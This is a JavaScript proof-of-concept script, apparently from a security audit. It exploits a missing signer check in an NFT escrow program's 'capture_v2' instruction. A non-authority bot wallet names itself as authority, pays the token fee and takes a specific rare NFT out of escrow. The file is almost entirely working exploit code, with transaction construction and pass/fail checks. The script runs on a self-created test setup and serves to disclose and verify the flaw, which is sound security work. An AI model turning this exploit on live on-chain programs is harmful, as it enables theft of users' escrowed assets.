// PoC 11 (EXECUTED, on-chain): capturer chooses which NFT they receive, and with
// NoRerollMetadata set capture is fully PERMISSIONLESS (any account may be passed as `authority`;
// assert_signer only runs if authority == recipe.authority; capture_v2.rs:183-185).
// A bot pays R tokens and names the rare asset directly -> cherry-pick from escrow.
const L = require('./lib.js');
const {getAccount, getAssociatedTokenAddressSync} = L;
const {TransactionInstruction} = L;
const NoRerollMetadata = 1;
async function bal(ata){ try{ return (await getAccount(L.conn, ata)).amount; }catch(e){ return 0n; } }
async function ownerOf(assetPk){
  const ai = await L.conn.getAccountInfo(assetPk);
  // BaseAssetV1: key(1) + owner(32) ...
  return new L.PublicKey(ai.data.slice(1,33));
}
(async()=>{
  const payer=L.Keypair.generate(); await L.airdrop(payer.publicKey,500);
  const authority=payer; const R=1_000_000n;
  const mint=await L.createMint(L.conn,payer,authority.publicKey,null,0);
  const col=await L.createCollection(payer,authority,'Mintmark','u');
  const escrow=await L.initEscrowV2(authority);
  const recipe=await L.initRecipeV1(authority,col.publicKey,mint,authority.publicKey,
    {name:'N',uri:'u',max:100,min:0,amount:Number(R),feeCapture:0,path:NoRerollMetadata});
  const escrowAta=(await L.getOrCreateAssociatedTokenAccount(L.conn,payer,mint,escrow,true)).address;

  // Escrow holds several NFTs; one is the "rare" (index 7).
  const assets={};
  for(const i of [1,2,7,9]) assets[i]=await L.createAsset(payer,col,authority,escrow,'Rare#'+i,'ipfs://'+i);
  const rare=assets[7];

  // A separate, un-privileged bot wallet (NOT the authority).
  const bot=L.Keypair.generate(); await L.airdrop(bot.publicKey,50);
  const botAta=(await L.getOrCreateAssociatedTokenAccount(L.conn,payer,mint,bot.publicKey)).address;
  await L.mintTo(L.conn,payer,mint,botAta,authority,Number(R)); // give the bot exactly R to capture once

  console.log('rare asset', rare.publicKey.toBase58(), 'owner before =', (await ownerOf(rare.publicKey)).toBase58(), '(escrow)');

  // Bot captures the RARE by naming it, passing a junk account as `authority` (not the recipe authority).
  const feeAta=(await L.getOrCreateAssociatedTokenAccount(L.conn,payer,mint,authority.publicKey)).address;
  const keys=L.captureKeys(bot, /*authority=*/ bot.publicKey, recipe, escrow, rare.publicKey, col.publicKey,
    botAta, escrowAta, mint, feeAta /*fee ATA owned by fee_location (validated upstream)*/, authority.publicKey);
  const ix=new TransactionInstruction({programId:L.MPL_HYBRID,keys,data:L.disc('capture_v2')});
  await L.send([ix],[bot]); // only the bot signs; no authority signature
  const newOwner=await ownerOf(rare.publicKey);
  console.log('rare owner after  =', newOwner.toBase58(), '(bot =', bot.publicKey.toBase58()+')');
  if(newOwner.equals(bot.publicKey)) console.log('POC 11 EXECUTED: PASS (permissionless cherry-pick of a chosen NFT by a non-authority bot)');
  else { console.log('POC 11 FAIL'); process.exit(1); }
})().catch(e=>{console.error('POC 11 ERROR',e.message,e.logs||'');process.exit(1);});
